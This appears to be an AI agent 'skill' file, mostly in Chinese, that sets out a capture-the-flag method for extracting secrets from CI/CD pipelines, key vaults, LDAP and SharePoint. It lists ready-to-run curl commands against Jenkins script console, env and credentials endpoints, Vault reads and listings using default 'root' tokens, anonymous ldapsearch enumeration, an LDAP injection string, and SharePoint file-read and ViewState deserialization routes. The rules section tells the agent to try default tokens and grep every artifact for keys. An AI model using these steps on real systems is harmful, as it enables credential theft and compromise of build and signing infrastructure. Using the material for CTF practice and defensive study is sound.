---
name: cicd-secrets-attack
description: CI/CD pipeline and secret management attack methodology. Use when the challenge involves "CI/CD 门户/构建 agent/deploy key/签名密钥/密钥托管/vault/目录服务" — infrastructure targets where the goal is to extract secrets from build systems, key vaults, or federated identity services.
---

# CI/CD & 密钥基础设施攻击通法

## 题型识别

| 题面关键词 | 攻击目标 | 方法 |
|---|---|---|
| "CI/CD 门户/构建 agent/部署签名密钥" | Jenkins/GitLab CI/GitHub Actions runner | 找构建日志泄露 / 环境变量 / 配置文件 / RCE via pipeline |
| "deploy key/fleet key" | SSH deploy key / API token | 找 .git/config / CI 环境变量 / webhook payload |
| "密钥托管/vault/federation" | HashiCorp Vault / Azure Key Vault / 自建 | 认证绕过 / unsealed vault / 默认 token / 路径遍历 |
| "目录服务集成/LDAP/AD" | LDAP/AD 集成的密钥系统 | LDAP 注入 / 匿名绑定 / 低权限枚举 |
| "SharePoint/farm secret" | SharePoint 门户 | ViewState 反序列化 / 配置泄露 / API 越权 |

## 通用攻击面

### 1. CI/CD Pipeline RCE

```bash
# Jenkins
curl http://target/script          # Groovy Script Console (如果未鉴权=直接RCE)
curl http://target/env             # 环境变量泄露
curl http://target/credentials     # 凭据管理
# GitLab CI
# 找 .gitlab-ci.yml → 看 variables / secrets 段
# GitHub Actions
# 找 workflow files → secrets.XXX → 是否 print/log 到输出
```

### 2. 构建日志/Artifact 泄露

- 构建日志里经常 print 出 API key / deploy token / DB 密码
- Artifact 下载(build 产物)里可能有 .env / config.yaml / 签名密钥文件
- 搜索: `grep -ri "key\|secret\|token\|password\|-----BEGIN" /path/to/artifacts/`

### 3. Vault / 密钥管理

```bash
# HashiCorp Vault
curl http://target:8200/v1/sys/health       # 健康检查(是否 unsealed)
curl http://target:8200/v1/secret/data/flag  # 直接读(如果 ACL 宽松)
# 常见默认 token: root / hvs.xxx / s.xxx
# 列举所有 secrets:
curl -H "X-Vault-Token: root" http://target:8200/v1/secret/metadata?list=true

# Azure Key Vault
# 需要有效 token → 找环境变量 AZURE_CLIENT_SECRET 或 managed identity
```

### 4. 目录服务(LDAP)

```bash
# 匿名绑定枚举
ldapsearch -x -H ldap://target -b "dc=example,dc=com" "(objectClass=*)"
# LDAP 注入(如果搜索框存在)
*)(uid=*))(|(uid=*    # 万能搜索
```

### 5. SharePoint

- `/_layouts/15/viewlsts.aspx` — 列出所有列表
- `/_api/web/lists` — REST API 列表访问
- `/_api/web/GetFileByServerRelativeUrl('/Shared Documents/xxx')/$value` — 直接读文件
- ViewState 反序列化(如果 machineKey 泄露 → RCE)
- 检查 `web.config` / `Farm secret` 是否通过 API 或配置文件可读

## 铁律

- **CI/CD 题第一件事: 找管理接口是否未鉴权**(Jenkins Script Console / GitLab API / Admin panel)
- **密钥题第一件事: 试默认 token 和匿名访问**
- **所有构建日志和 artifact 都要 grep secret/key/token**
- 题面说"patched" = 常规漏洞已修,找逻辑/配置缺陷而非 CVE
